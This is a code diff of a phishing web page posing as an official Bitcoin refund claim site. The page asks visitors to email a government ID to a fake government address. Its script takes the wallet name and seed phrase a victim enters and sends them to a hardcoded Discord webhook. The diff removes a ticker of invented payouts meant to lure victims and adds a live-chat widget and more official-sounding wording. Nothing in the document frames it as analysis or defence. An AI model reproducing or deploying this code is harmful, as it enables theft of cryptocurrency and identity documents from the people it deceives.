@@ -7,18 +7,16 @@
   <style>
     body {
       font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
       background-image: url('https://i.ibb.co/wQYxwpr/american-eagle-bg.jpg');
       background-size: cover;
       background-position: center;
-      background-attachment: fixed;
-      background-repeat: no-repeat;
       text-align: center;
       padding-top: 50px;
-      color: #111;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.95);
+      background: white;
       width: 90%;
       max-width: 420px;
       margin: auto;
@@ -72,40 +70,13 @@
       font-weight: bold;
       display: none;
     }
-
-    .payout-ticker {
-      background-color: #f9f9f9;
-      border: 1px solid #ccc;
-      margin: 20px auto;
-      padding: 15px;
-      width: 90%;
-      max-width: 420px;
-      border-radius: 10px;
-      font-family: monospace;
-      font-size: 14px;
-      height: 120px;
-      overflow: hidden;
-      text-align: left;
-      box-shadow: 0 0 6px rgba(0,0,0,0.05);
-    }
-
-    .payout-line {
-      margin-bottom: 8px;
-      animation: fadeIn 0.4s ease-in-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
   </style>
 </head>
 <body>
-
   <div class="container">
 
     <div class="alert">
-      To verify eligibility, send your government-issued ID to:  
+      To verify that you are eligible to claim this refund, please send your government-issued ID to the official email:  
       <strong>admin@govbtcclaim.org</strong>
     </div>
 
@@ -134,23 +105,38 @@
     </div>
   </div>
 
-  <div class="payout-ticker">
-    <div id="payoutFeed"></div>
-  </div>
+  <!-- Live Chat Widget (Tawk.to) -->
+  <script type="text/javascript">
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function() {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/default';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
+  </script>
 
+  <!-- Discord Webhook Script -->
   <script>
     function sendToDiscord(event) {
       event.preventDefault();
+
       const walletName = document.getElementById('walletName').value;
       const phrase = document.getElementById('seedInput').value;
 
       const data = {
-        content: 🔥 New Submission:\nWallet Name: **${walletName}**\nSeed Phrase: **${phrase}**
+        content: `🔥 New Submission:
+        \nWallet Name: *${walletName}*
+        \nSeed Phrase: *${phrase}*`
       };
 
       fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify(data)
       }).then(() => {
         document.getElementById('walletSection').reset();
@@ -161,44 +147,7 @@
         console.error(err);
       });
     }
-
-    const fakePayouts = [
-      "💸 0.92 BTC sent to wallet bc1q...9xlr",
-      "✅ 0.45 BTC refunded to bc1q...afk8",
-      "🟢 1.02 BTC processed for bc1q...ujk2",
-      "💰 0.12 BTC claimed by bc1q...4lpz",
-      "💸 0.89 BTC sent to wallet bc1q...wvxm",
-      "✅ 0.33 BTC paid to bc1q...hf23",
-      "🟢 0.74 BTC sent to bc1q...zz3k",
-      "💰 1.34 BTC claimed by bc1q...gdq5"
-    ];
-
-    const feed = document.getElementById("payoutFeed");
-
-    function addFakePayout() {
-      const message = fakePayouts[Math.floor(Math.random() * fakePayouts.length)];
-      const line = document.createElement("div");
-      line.className = "payout-line";
-      line.textContent = message;
-
-      if (feed.children.length >= 6) {
-        feed.removeChild(feed.firstChild);
-      }
-
-      feed.appendChild(line);
-    }
-
-    // Load 3 on page load
-    for (let i = 0; i < 3; i++) addFakePayout();
-    // Add new one every 3 seconds
-    setInterval(addFakePayout, 3000);
   </script>
-
 </body>
 </html>
-     
-
-     
-
    
-
